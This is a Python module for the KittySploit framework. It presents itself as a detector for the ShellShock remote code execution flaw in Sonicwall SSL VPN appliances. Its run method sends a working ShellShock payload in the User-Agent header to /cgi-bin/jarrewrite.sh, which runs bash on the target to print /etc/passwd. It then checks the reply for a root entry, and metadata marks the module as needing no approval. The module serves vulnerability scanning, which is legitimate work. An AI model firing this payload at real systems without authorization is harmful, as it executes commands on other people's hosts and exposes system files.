#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sonicwall SSLVPN contains a 'ShellShock' vulnerability which allows remote unauthenticated attackers to execut."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sonicwall SSLVPN - Remote Code Execution (ShellShock) Detection',
        'description': "Sonicwall SSLVPN contains a 'ShellShock' vulnerability which allows remote unauthenticated attackers to execute arbitrary commands.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'shellshock', 'sonicwall', 'rce', 'vpn', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://twitter.com/chybeta/status/1353974652540882944',
            'https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/',
        ],
    }

    def run(self):
        path = '/cgi-bin/jarrewrite.sh'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'User-Agent': '"() { :; }; echo ; /bin/bash -c \'cat /etc/passwd\'"', 'Accept': '*/*'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Sonicwall SSLVPN - Remote Code Execution (ShellShock) detected', path=path)
            return True
        return False

